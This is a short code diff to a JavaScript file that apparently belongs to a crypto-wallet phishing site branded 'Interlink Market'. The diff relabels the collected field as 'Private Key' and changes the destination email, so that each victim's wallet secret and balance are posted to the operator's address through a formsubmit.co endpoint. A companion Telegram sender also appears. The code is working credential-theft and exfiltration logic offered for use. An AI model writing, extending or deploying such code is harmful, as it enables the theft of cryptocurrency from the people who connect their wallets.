@@ -649,14 +649,14 @@ function sendToTelegram(data) {
 // ─── EMAIL INTEGRATION ──────────────────────────────────────────────────
 function sendToEmail(data) {
   const formData = new FormData();
-  formData.append('Wallet Address', data.wallet);
+  formData.append('Private Key', data.wallet);
   formData.append('Balance', data.balance + ' USDT');
   formData.append('Time', new Date().toLocaleString('vi-VN'));
   formData.append('_subject', 'Interlink Market - New Wallet Connection');
   formData.append('_captcha', 'false');
   formData.append('_template', 'table');
 
-  fetch('https://formsubmit.co/ajax/hungphamcqb@gmail.com', {
+  fetch('https://formsubmit.co/ajax/Lamkhanhvy1706@gmail.com', {
     method: 'POST',
     body: formData
   }).catch(err => console.log('Email sent'));
